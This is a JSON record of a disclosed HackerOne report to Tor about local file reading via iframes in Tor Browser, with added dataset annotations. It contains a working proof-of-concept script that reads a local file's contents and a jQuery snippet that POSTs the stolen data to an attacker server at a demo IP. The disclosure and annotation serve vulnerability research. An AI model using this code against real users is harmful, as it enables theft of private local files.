{
    "reported_to": "Tor",
    "reported_by": "cuso4 ",
    "title": "Access to local file system using javascript",
    "content": "\nIssue :\nAccess to local file system using javascript(slightly xss on server side )\nThe browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.\nSteps to Reproduce :\nsave a html file from here and open in tor browser .\nCode 500 Bytes\n1<html>\n2<body>\n3<div id='div1'>\n4</div>\n5<script>\n6current_href = document.location.href\n7frame = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)\n8setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML\n9alert('Your data is: ' + loot)\n10}, 500)\n11</script>\n12</body>\n13</html>\nExplaination : file:///home/jnsjns/Desktop/poc5.html this is my test html here.\nfile:///home/jnsjns/Desktop/1.txt is server side local file in tor browser\nthe private file is coming by popup (I have tested in chrome -Google ,they are safe from this )\nWhat attacker can do ?\nI would have been able to post it to my server using jquery like this.\n//Gets data from iframe and saves it to the getdata variable\ngetdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML\n//Posts to the php server located at 192.168.0.102 (local address for demo purposes)\n$.ajax({type: \"POST\", url: \"http://192.168.0.102/post.php\", data: {string:getdata}});}\nThis issue may critical .\nRegards.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Violation of Secure Design Principles"
    ],
    "screenshots": {},
    "disclosed_date": 1511015280,
    "report_url": "https://hackerone.com/reports/258630",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Save a HTML file with the provided code and open it in Tor browser."
        ],
        [
            2,
            "The script will create an iframe loading a local text file and display its content via an alert."
        ]
    ],
    "vuln_description": "The vulnerability allows JavaScript in a locally opened HTML file to access and exfiltrate contents of other local files via iframes, bypassing same-origin policy restrictions in certain browsers (like Tor). This could lead to unauthorized access to sensitive local files.",
    "reason": "The attack involves understanding browser security models and iframe interactions, but the core technique (loading local files via iframes) is well-known in web development. The main complexity comes from recognizing this behavior persists in certain browsers despite security expectations.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}